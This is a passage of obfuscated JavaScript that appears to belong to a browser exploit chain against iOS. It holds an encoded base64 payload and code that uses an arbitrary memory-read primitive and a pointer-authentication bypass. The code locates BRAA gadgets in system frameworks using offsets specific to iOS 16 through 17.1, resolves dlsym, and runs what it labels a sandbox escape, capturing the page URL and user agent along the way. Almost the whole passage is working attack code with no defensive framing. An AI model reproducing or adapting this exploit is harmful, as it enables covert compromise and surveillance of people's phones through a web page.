20AwS9uAEsvZACyLoAAEAY4MkYAOjJuADwyri4oMuQu5i5DMgUCkADZCF8AITJIAFQAVABQANIuqAExAF8AAwOAAMcnkTCQMAEALjIcBE8v/y70Lp0ury4GL1cyWTIDL3gA8yQsMmUyRgBnMg8vaTIEL7AueQBtMlAA6S5zAHAAqAE+L0gADy9EMn8BczJ1MtcBAy9rMnkAATJMAHouVy+9AVAuNzJVMmYyigJ2MowyVgAaMtMDfy5DAAUvaQD5A2QvAS9oAGEAvQFnGdQcXwBTAEEATgBEAEIATwBYABwCSABFAEMASwBfAE4ATwBfAFIARQBvL4YNRwGYAGIyYzIPMrQyUwD3A2MAnQIxAU8vzi9CAGwAJTJrAEcBRzIbAaouuQFwAHUAuQFhL2EAYgBNL6wDaQCyLg8yWwJELl8A1gLUL5sCbABmAHQOgABIAA8ydgBtAIgCXAJlANEBFjLNMugy6jItLl0CdgFHLlIyQAB1A2wA6wF3AWIAXwDXMi8uwy49AiEBfwEfMhwCRgBEANUCYQD+Lg8vMQFnGQAAPSIFMxwECDPWAkcA0wFCADYuZQBQAIoCDjNyABAAETMHMwkzFTN0AEwAei9nANQBHDMYAB8zRAB9LmUvjS4LMwAvHDMgACozLDPVA40uIjOYMmwAdQBSMg8zKAAfM0UAcQB1AL4uHDMwAB8zIjN9L30BSQBEABwzOABUMhwEezJNAH8ucwDsMgcyfQEvLhczMQFiAT0CcgBAAE0zRgBPM1Ez7DLNA3AAlymeLvMkWjNIAF0zXzOyAmEz/y4xAUUAbgMGLxwzUABpM1gyUABQM2szXQIvMzEB6S5AM38uNAFaM1gAdDNZMnczUjNdAiIzfTJ/MqkBZQDHMl8BcwDNA0QyHDNgAIIzdjNgM10CjjIwMnUDHDPaCvkxTjN1M4Qz7DKOMoIyYQCEMkYA2jL6MjgzOjMcM3AAHzOJMgUveQCaA14BejNlAOIv1AGHMpgCWjN4AB8z6S6jM7YzQwDKMjYyWjPxGbozgzK9M64uJSpqMq4zHDO7B10zuzNkAL0zbTPPA6QDezJ8MzozqgFaMy8mwzO8M5Uy1wGyM7Qz8wpNLzszcgCmGtkzzjPbM20ATwBVMxwzTQ3kM7YzzTMcM/0G7DPmM1MARC5lAJ8uDi/eM0oyTDIeA1ozsACdJJwzSTLEM/Iz0wG+M9oyIC9aM7gA/jMGM80ztjOOMq0zeTIcM/MWwzMyMsAzDzM1F7ozOzI9MiIzQwD8A50CBjQPM9AACTQ5Mhg0ri5KMkkAQjLCLxwzVAEXNEsyPTJPL64uHDP2Bh8zZzKQMt0z4y9DADM0vgEcM9AMMjSKApAyGjQ4NL8BWjPwACE0dDI9NL4BIjMkM74BJzNaM/gARDRANCIzxS7vLqcBZACQMhwzmw08NLwBRzTTAUczZQBJM8oz5RX/M1UAUgBMAGIzizL0M9gB1zNgNAYzYjRkNNAz8i5tAKUzTi+BLukubwN/Lnov1gJlLxwz1Q0fM2w0NTS1M0Y0QTQPMz0aOAmnMlApeQDWAW0AfS4uNJ0CZTRvMtoyWTMPM4UapjJcGcoy3C/uMWoACy9fANwuRi5nAC4D/DPjBfkxlDTLMpc0mTRUNH4ybwAUNHIAuACgNBsBXwB+AZ0uhTIPM1gk+THWMuAuHDNACaYyYgBILp0uHDOCJ6YyQi4kMpYIWjOQAjMPuQHzLnU0cQOoATQvYS7CL/4ydQBmAGYAATMPM84WpjJkAGwAsAKoNOEzuQLVNMoy6TNCNKw01jRzAIMCHDO4H6YyMgG1A8Ez2yD5MQICZQDhM4gA6jRfAKou5y9cLtcz8DRoAKg0dADsAfgD7wFaM5gA9jT4NFUySy57AV8ANy+WLuEDWjNNCqYy3TIAAvc0XgHiMvAnWjO7HPkxWwLBNBwzsADwNNIBbQBjAGMzHDO4ABg1lwM+L/k0kDRyAC0FCjVbAvszFTQDAO0xmgK+LpU0vTTwNK0ukwHzNF8CKTQwNdQB/y7rAdUCigLLNLsBbwBmM9M0NjUeCIMymjRXL3IA+jToNA8zvgWmMokCQjWjM0Q1OzUhNUQy1gJELl4BMDNCNEE1ODW5AdAz5DTwNFIzLy6FAngAuQF6AdwvVjQEAKYyPi8nNfc0nQJaNQwz7jRmNfkxaDVhL2o17TKcNMcCHDOQAG81mwJpNc4DXwB3AKMyfzMPM5gAeTWcNEMueTQINYM1bgBvA8QCEDWRNIM1cwBCLvgDFjWDNXg0HTWTNXIARC6xNCQ1ljWfLig1cgDIAJY11zTVAr00oDUbNT81cgC3JGc1igIOL5400zSWNW4AQi4+L6cvnTXoAK41sjUcM3gkqTXGAqU15DSWNbsBVjQFAGc1lQM0L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"));
        this.xA = utilityModule.resolveUrlPadded(fixedValue1);
        this.cA = fixedValue2;
        this.iA = utilityModule.resolveUrlPadded(fixedValue3);
        //alert("AAA" + this.xA);
        this.GA = !0;
        let C = document.URL;
        for (C += "\0"; C.length % 4 != 0;) C += "\0";
        let I = navigator.userAgent;
        for (this.OA = utilityModule.utf16Decode(C), I += "\0"; I.length % 4 != 0;) I += "\0";
        this.KA = utilityModule.utf16Decode(I), this.RA = new Offset64(0, 0), this.kA = new Offset64(0, 0), this.zA = new Offset64(0, 0);
    }
    length() {
        return 2 * (this.yA.length + this.oA.length + this.xA.length + this.cA.length + this.OA.length + this.KA.length + this.iA.length);
    }
    FA(A) {
        this.RA = A;
    }
    VA() {
        return this.RA;
    }
    YA() {
        return this.RA.add(2 * this.oA.length);
    }
    HA() {
        let A = this.VA();
        return null !== A && (A = A.add(this.length())), A;
    }
    SA(A) {
        const g = this.VA();
        let D = g.add(2 * this.oA.length).add(2 * this.yA.length);
        const M = D.add(2 * this.cA.length),
            C = M.add(2 * this.xA.length),
            I = C.add(2 * this.OA.length),
            w = I.add(2 * this.KA.length),
            Q = w.add(2 * this.iA.length);
        let B = null;
        const N = new Offset64(g.it, g.et),
            E = new Offset64(D.it, D.et),
            T = new Offset64(M.it, M.et),
            U = new Offset64(C.it, C.et),
            L = new Offset64(I.it, I.et),
            s = new Offset64(w.it, w.et),
            k = new Offset64(A.it, A.et),
            F = new Offset64(Q.it, Q.et),
            S = new Offset64(this.kA.it, this.kA.et),
            Y = new Offset64(this.zA.it, this.zA.et);
        let y = new Offset64(0, 0),
            o = new Offset64(0, 0),
            c = new Offset64(0, 0),
            i = new Offset64(0, 0),
            G = new Offset64(0, 0),
            O = new Offset64(0, 0),
            K = new Offset64(0, 0),
            R = new Offset64(0, 0),
            z = new Offset64(0, 0);
        const V = new Offset64(0 | platformModule.platformState.kn, 0),
            H = new Offset64(platformModule.platformState.Pn ? 1 : 0, 0);
        if (null !== platformModule.platformState.caller && !0 === platformModule.platformState.qn) {
            const A = platformModule.platformState.pacBypass,
                exploitPrimitive = platformModule.platformState.exploitPrimitive,
                D = platformModule.cr(),
                M = D.Sh(),
                C = D.bh("__TEXT", "__text"),
                I = D.dlsym("_ZN3JSC16jitOperationListE"),
                w = exploitPrimitive.readRawBigInt(I),
                Q = exploitPrimitive.read32(w - 4),
                B = function (A, D) {
                    for (let M = 0; M < Q; M++) {
                        const I = exploitPrimitive.readRawBigInt(w + 16 * M),
                            Q = 8;
                        if (C.qe <= I && I <= C.qe + C.Oo - Q && exploitPrimitive.read32(I) === A && exploitPrimitive.read32(I + 4) === D) return exploitPrimitive.readInt64FromOffset(w + 16 * M + 8);
                    }
                    return utilityModule.Int64.fromNumber(0);
                }(0xd289222d, 0xd71f0c4d);
            if (B.Et()) throw new Error("B.Et()");
            K = new Offset64(B.it, B.et);
            const N = 0x4911,
                findBRAAGadget = function (filePath, needle) {
                    const C = M.Jh(filePath)._h("__TEXT", "__text"),
                        I = C.qe + C.Oo - 4 * needle.length;
                    for (let A = C.qe; A <= I; A += 4) {
                        let M = !0;
                        for (let C = 0; C < needle.length; C++)
                            if (exploitPrimitive.read32(A + 4 * C) !== needle[C]) {
                                M = !1;
                                break;
                            } if (M) return A;
                    }
                    window.log("ERROR: gadget not found in " + filePath + ": " + needle);
                    return 0;
                },
                T = function (A, g, D) {
                    const M = g(gA.Int64.fromNumber(A), gA.Int64.fromNumber(D));
                    return new Offset64(M.it, M.et);
                };
            let U = 0,
                L = 0;
            // Select framework and gadget offsets based on iOS version (P.platformState.iOSVersion)

            if (platformModule.platformState.iOSVersion >= 170100) {

                // iOS ≥ 17.1
                U = findBRAAGadget(
                    "/System/Library/PrivateFrameworks/HomeSharing.framework/HomeSharing",
                    [
                        0xaa0c03e8,
                        0xd29b8c11,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                // constant used later when resolving additional gadgets
                L = 0xDC60;

            } else if (platformModule.platformState.iOSVersion >= 170000) {

                // iOS 17.0
                U = findBRAAGadget(
                    "/System/Library/Frameworks/CoreML.framework/CoreML",
                    [
                        0xaa0c03e8,
                        0xd2909cd1,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                L = 0x84E6;

            } else if (platformModule.platformState.iOSVersion >= 160400) {

                // iOS ≥ 16.4
                U = findBRAAGadget(
                    "/System/Library/Frameworks/CoreML.framework/CoreML",
                    [
                        0xaa0c03e8,
                        0xd29e65b1,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                L = 0xF32D;

            } else if (platformModule.platformState.iOSVersion >= 160000) {

                // iOS 16.0 – 16.3
                U = findBRAAGadget(
                    "/System/Library/PrivateFrameworks/HomeSharing.framework/HomeSharing",
                    [
                        0xaa0c03e8,
                        0xd2935db1,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                L = 0x9AED;

            } else {

                // Older systems fallback
                U = findBRAAGadget(
                    "/System/Library/Frameworks/MediaToolbox.framework/MediaToolbox",
                    [
                        0xaa0c03e8,
                        0xd29dce11,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                L = 0xEE70;
            }

            // Fail if framework / gadget lookup failed
            if (U === 0x0) throw new Error("U === 0x0");

            // Resolve first stage gadget chain
            G = T(U, A.pacia.bind(A), N);

            let s = 0x0;
            // Select another framework + offsets depending on iOS version
            if (platformModule.platformState.iOSVersion >= 170100) {

                // iOS ≥ 17.1
                s = findBRAAGadget(
                    "/System/Library/PrivateFrameworks/PassKitCore.framework/PassKitCore",
                    [
                        0xaa0b03e2,
                        0xd28c7331,
                        0xd71f09d1  // braa x14, x17
                    ]

                );

                // 64-bit constant (low/high)
                R = new Offset64(0x6399, 0x0);

            } else if (platformModule.platformState.iOSVersion >= 170000) {

                // iOS 17.0
                s = findBRAAGadget(
                    "/System/Library/PrivateFrameworks/AppleMediaServices.framework/AppleMediaServices",
                    [
                        0xaa0b03e2,
                        0xd29bc671,
                        0xd71f09d1  // braa x14, x17
                    ]

                );

                R = new Offset64(0xDE33, 0x0);

            } else if (platformModule.platformState.iOSVersion >= 160400) {

                // iOS ≥ 16.4
                s = findBRAAGadget(
                    "/System/Library/PrivateFrameworks/SpringBoard.framework/SpringBoard",
                    [
                        0xaa0f03e2,
                        0xd29336f1,
                        0xd71f09d1  // braa x14, x17
                    ]

                );

                R = new Offset64(0x99B7, 0x0);

            } else if (platformModule.platformState.iOSVersion >= 160000) {

                // iOS 16.0 – 16.3
                s = findBRAAGadget(
                    "/System/Library/Frameworks/CoreML.framework/CoreML",
                    [
                        0xaa0f03e2,
                        0x528b636d,
                        0x72a539cd,
                        0xaa0903ee, 
                        0xd2820371,
                        0xd71f0991  // braa x12, x17
                    ]

                );

                R = new Offset64(0x101B, 0x0);

            } else {

                // Older systems fallback
                s = findBRAAGadget(
                    "/System/Library/Frameworks/MediaToolbox.framework/MediaToolbox",
                    [
                        0xaa0f03e2,
                        0xaa0c03e8,
                        0xd29dce11,
                        0xd71f0951  // braa x10, x17
                    ]

                );

                R = new Offset64(0xEE70, 0x0);
            }

            // Fail if lookup failed
            if (s === 0x0) throw new Error("s === 0x0");

            // Resolve second gadget chain
            O = T(s, A.pacia.bind(A), N);


            // Resolve additional runtime addresses using L
            y = T(A.La.Dt().yt(), A.pacda.bind(A), L);
            o = T(A.Xa.Dt().yt(), A.pacda.bind(A), L);
            c = T(A.Ga.Dt().yt(), A.pacda.bind(A), L);
            i = T(A.Ma.Dt().yt(), A.pacda.bind(A), L);


            // Lookup symbol "dlsym" inside libdyld
            const k = M.Jh("/usr/lib/system/libdyld.dylib").dlsym("dlsym");

            // Construct 64-bit address from JS number
            z = new Offset64(
                k >>> 0x0, // low 32 bits
                k / 0x100000000 >>> 0x0 // high 32 bits
            );
        }
        return 0 === this.cA.length && (D = 0), B = CA(k, F, 0, N, 2 * this.oA.length, T, E, U, S, L, s, y, o, c, i, K, G, O, R, z, Y, V, H), this.oA + B + this.cA + this.xA + this.OA + this.KA + this.iA;
    }
}
// ── Module export ────────────────────────────────────────────────────────
r.lA = () => {// Entry point: resolves APIs, builds payload, executes sandbox escape
    const A = globalThis.moduleManager.getModuleByName("b5135768e043d1b362977b8ba9bff678b9946bcb");
    return A._d(), A.qd(), executeSandboxEscape();
};
return r;
